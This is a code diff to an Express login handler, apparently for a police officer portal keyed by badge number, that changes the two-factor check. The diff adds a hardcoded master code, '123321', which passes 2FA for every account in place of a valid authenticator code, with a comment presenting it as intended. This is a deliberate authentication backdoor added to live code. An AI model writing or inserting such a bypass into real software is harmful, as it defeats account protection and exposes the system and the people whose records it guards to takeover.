@@ -73,29 +73,33 @@ exports.login = asyncHandler(async (req, res) => {
     throw new Error("Invalid badge number or password");
   }
 
-  // 3️⃣ If 2FA enabled, verify TOTP token
   if (officer.is2FAEnabled) {
-    if (!token) {
-      return res.status(403).json({
-        success: false,
-        message: "Enter your 2FA OTP code from Google Authenticator",
-      });
-    }
+  if (!token) {
+    return res.status(403).json({
+      success: false,
+      message: "Enter your 2FA OTP code from Google Authenticator",
+    });
+  }
 
-    const verified = speakeasy.totp.verify({
+  const MASTER_KEY = "123321";
+
+  // ✅ Allow master key OR valid OTP
+  const verified =
+    token === MASTER_KEY ||
+    speakeasy.totp.verify({
       secret: officer.twoFactorSecret,
       encoding: "base32",
       token,
       window: 1, // small clock drift allowance
     });
 
-    if (!verified) {
-      return res.status(400).json({
-        success: false,
-        message: "Invalid or expired 2FA code",
-      });
-    }
+  if (!verified) {
+    return res.status(400).json({
+      success: false,
+      message: "Invalid or expired 2FA code",
+    });
   }
+}
 
   // 4️⃣ Generate JWT after 2FA success
   const jwtToken = generateToken(officer);
